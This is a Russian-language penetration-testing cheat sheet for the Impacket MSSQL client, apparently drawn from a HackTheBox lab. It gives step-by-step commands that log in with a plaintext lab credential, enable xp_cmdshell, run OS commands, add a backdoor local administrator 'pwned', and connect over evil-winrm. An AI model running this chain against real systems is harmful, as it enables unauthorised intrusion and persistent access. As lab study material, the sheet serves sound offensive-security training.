# Tool: impacket-mssqlclient

## Категория
Tool / Windows / MSSQL

## Назначение
`impacket-mssqlclient` — инструмент из набора Impacket для подключения к Microsoft SQL Server (TCP/1433).

Используется для:
- проверки валидности учётных данных
- получения интерактивного SQL-доступа
- выполнения команд ОС через `xp_cmdshell`
- получения первичного доступа (foothold) к Windows-системе

Часто применяется, когда:
- веб-логин не работает
- но есть креды
- и открыт MSSQL-порт

---

## Базовый синтаксис

```bash
impacket-mssqlclient <user>:'<password>'@<ip_or_host>

Пример:

impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@10.10.11.95

или:

impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@eighteen.htb

Признаки успешного входа

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] Logged in successfully

После этого появляется интерактивный prompt:

SQL>

Базовая разведка в MSSQL
Текущий пользователь

SELECT SYSTEM_USER;
SELECT USER_NAME();

Проверка роли sysadmin

SELECT IS_SRVROLEMEMBER('sysadmin');

Результат:

    1 — sysadmin (максимальные права)

    0 — ограниченные права

Включение xp_cmdshell

⚠️ Требуются права sysadmin.
Включить advanced options

EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

Включить xp_cmdshell

EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

Проверка выполнения команд

EXEC xp_cmdshell 'whoami';

Типовые команды через xp_cmdshell
Информация о системе

EXEC xp_cmdshell 'hostname';
EXEC xp_cmdshell 'systeminfo';

Пользователи

EXEC xp_cmdshell 'net user';

Привилегии

EXEC xp_cmdshell 'whoami /priv';

Закрепление (опционально)

Создание локального администратора:

EXEC xp_cmdshell 'net user pwned Password123! /add';
EXEC xp_cmdshell 'net localgroup administrators pwned /add';

После этого возможен вход по WinRM.
Связь с WinRM

Если открыт порт 5985:

evil-winrm -i <ip> -u pwned -p 'Password123!'

Типовой атакующий паттерн

Credentials
   ↓
MSSQL (1433)
   ↓
impacket-mssqlclient
   ↓
sysadmin?
   ↓
xp_cmdshell
   ↓
OS Command Execution
   ↓
WinRM / Shell

Важные заметки

    Web-аутентификация ≠ MSSQL ≠ Windows

    MSSQL — частая точка входа без CVE

    Использование валидных кредов = exploitation

    Один из самых надёжных путей foothold на Windows